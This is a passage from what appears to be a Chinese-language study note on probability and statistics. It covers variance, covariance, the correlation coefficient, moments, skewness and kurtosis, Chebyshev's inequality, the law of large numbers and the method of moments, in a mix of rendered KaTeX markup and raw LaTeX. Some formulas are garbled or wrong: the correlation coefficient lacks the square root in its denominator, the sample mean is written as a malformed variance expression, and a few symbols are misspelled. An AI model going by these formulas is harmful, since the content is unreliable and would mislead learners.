class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>V</mi><mi>a</mi><mi>r</mi><mo stretchy="false">(</mo><mi>k</mi><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>k</mi><mn>2</mn></msup><mi>V</mi><mi>a</mi><mi>r</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Var(kX)=k^2Var(X)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span>，若X和Y相互独立<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>V</mi><mi>a</mi><mi>r</mi><mo stretchy="false">(</mo><mi>X</mi><mo>+</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>V</mi><mi>a</mi><mi>r</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>+</mo><mi>V</mi><mi>a</mi><mi>r</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Var(X+Y)=Var(X)+Var(Y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span></span></li></ul></li><li><strong>协方差：</strong><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>C</mi><mi>o</mi><mi>v</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>E</mi><mo stretchy="false">(</mo><mi>X</mi><mi>Y</mi><mo stretchy="false">)</mo><mo>−</mo><mi>E</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mi>E</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Cov(X,Y)=E(XY)-E(X)E(Y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span></span>，当X和Y独立时，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>C</mi><mi>o</mi><mi>v</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">Cov(X,Y)=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>。协方差表示两个随机变量变化趋势的度量，大于零表示趋势相同，小于零趋势相反，等于零表示不相关。<ul><li>协方差的性质：若<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>V</mi><mi>a</mi><mi>r</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><msubsup><mi>σ</mi><mn>1</mn><mn>2</mn></msubsup></mrow><annotation encoding="application/x-tex">Var(X)=\sigma_1^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0622159999999998em;vertical-align:-0.24810799999999997em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span></span></span></span>；<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>V</mi><mi>a</mi><mi>r</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><msubsup><mi>σ</mi><mn>2</mn><mn>2</mn></msubsup></mrow><annotation encoding="application/x-tex">Var(Y)=\sigma_2^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0622159999999998em;vertical-align:-0.24810799999999997em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span></span></span></span>，则<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mi>C</mi><mi>o</mi><mi>v</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mi mathvariant="normal">∣</mi><mo>&lt;</mo><mo>=</mo><msub><mi>σ</mi><mn>1</mn></msub><msub><mi>σ</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">|Cov(X,Y)| &lt;=\sigma_1\sigma_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。当X和Y之间有线性关系时，等号成立。例如：X=aY+b。</li></ul></li><li><strong>相关系数：</strong><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>ρ</mi><mrow><mi>X</mi><mi>Y</mi></mrow></msub><mo>=</mo><mfrac><mrow><mi>C</mi><mi>o</mi><mi>v</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow><mrow><mi>V</mi><mi>a</mi><mi>r</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mi>V</mi><mi>a</mi><mi>r</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">\rho_{XY}=\frac{Cov(X,Y)}{Var(X)Var(Y)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">ρ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.07847em;">X</span><span class="mord mathdefault mtight" style="margin-right:0.22222em;">Y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.53em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.22222em;">V</span><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span><span class="mopen mtight">(</span><span class="mord mathdefault mtight" style="margin-right:0.07847em;">X</span><span class="mclose mtight">)</span><span class="mord mathdefault mtight" style="margin-right:0.22222em;">V</span><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span><span class="mopen mtight">(</span><span class="mord mathdefault mtight" style="margin-right:0.22222em;">Y</span><span class="mclose mtight">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.07153em;">C</span><span class="mord mathdefault mtight">o</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">v</span><span class="mopen mtight">(</span><span class="mord mathdefault mtight" style="margin-right:0.07847em;">X</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.22222em;">Y</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><ul><li>相关系数的性质：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><msub><mi>ρ</mi><mi mathvariant="normal">∣</mi></msub><mo>&lt;</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">|\rho_|&lt;=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1052em;vertical-align:-0.3551999999999999em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault">ρ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34480000000000005em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3551999999999999em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></li></ul></li><li>**协方差矩阵：**当有多个随机向量，每两个随机向量间都可以得到一个协方差，从而组成了协方差矩阵，协方差矩阵时对称阵。$$<br />\begin{bmatrix}<br />c_{11} &amp; c_{12} &amp; \cdots &amp; c_{1n} \\<br />c_{21} &amp; c_{22} &amp; \cdots &amp; c_{2n} \\<br />\vdots &amp; \vdots &amp; \ddots  &amp; \vdots \\<br />c_{n1} &amp; c_{n2} &amp; \cdots &amp; c_{nn} \\<br />\end{bmatrix}</li></ul>## 矩- k阶原点矩$E(X^k)$  - k阶中心距$E \{ [X-E(X)]^k \} $    - 通过矩的定义可以看出，期望是1阶原点矩，方差是2阶中心距。三阶的统计量偏度，四阶统计量是峰度。    - 偏的方向尾巴更长。  - 左偏（负偏）|右偏（正偏）![paste image](http://p8cigu7up.bkt.clouddn.com/1526195691472ao96bwj9.png?imageslim)  - 峰度度量的是峰的陡峭程度。通常定义四阶中心矩除以方差的平方减3。减3为了让正态分布的峰度为0，超值峰度为正，称为尖峰态，负为低峰态。它是反应陡峭程度，但需要跟其他结合分析。- **契比雪夫不等式：**随机变量X的期望$\mu$和方差$\sigma^2$，对于任意正数$\epsilion$$P({|X-\mu|>=\epsilon})<=\frac{\sigma^2}{\epsilon^2}$- **大数定理：**随机变量X1~Xn相互独立，并且具有相同的期望$\mu$和方差$\sigma^2$，$Y_n=\frac{1}{n}\sum_{i=1}^nX_i$，对于任意正整数$\epsilon$$\lim_{n\to\infty}P({|Y_n-\mu|<\epsilon})=1$- 大数定理为实际应用中频率来估计概率提供了理论依据。正态分布的参数估计，朴素贝叶斯做垃圾邮件分类，隐马尔科夫模型有监督参数学习等。- **伯努利定理：**是大数定理最早的形式，表争了事件A发生的频率收敛于事件A发生的概率P。## 统计学### 统计量- **样本：**$X_1，X_1，…X_n$  - **样本均值：**$\overline{X}=/frac{1}{n}/sum_{i=1}^n(X_i-\overline{X})^2$  - **样本方差：**$S^2=\frac{1}{n-1}\sum_{i=1}^n(X_i-\overline{X})^2$（n-1保证无偏）  - **k阶样本原点矩：**$A_k=\frac{1}{n}\sum_{i=1}^nX_i^k$  - **k阶样本中心矩：**$M_k=\frac{1}{n}\sum_{i=1}^n(X_i-\overline{X})^k$### 矩估计- 有一些独立同分布的样本，待求均值$\mu$和方差$\sigma^2$，有原点矩表达式是这样的：$$\begin{cases}E(X)=\mu \\\\E(X^2)=Var(X)+[E(X)]^2=\sigma^2+\mu^2 \\\\ \end{cases}<ul><li>根据样本可以求得原点矩：</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>A</mi><mn>1</mn></msub><mo>=</mo><mfrac><mn>1</mn><mi>n</mi></mfrac><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msub><mi>X</mi><mi>i</mi></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>A</mi><mn>2</mn></msub><mo>=</mo><mfrac><mn>1</mn><mi>n</mi></mfrac><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msubsup><mi>X</mi><mi>i</mi><mn>2</mn></msubsup></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\begin{cases}A_1=\frac{1}{n} \sum_{i=1}^n X_i \\\\A_2=\frac{1}{n} \sum_{i=1}^n X_i^2 \\\\ \end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:5.76em;vertical-align:-2.63em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.9500200000000003em;"><span style="top:-1.59999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-1.59999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-1.89999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-2.19999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-3.1500100000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.30001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.60001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.90001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-5.20002em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.45002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.1300000000000003em;"><span style="top:-5.130000000000001em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.6900000000000004em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"></span></span><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.441336em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 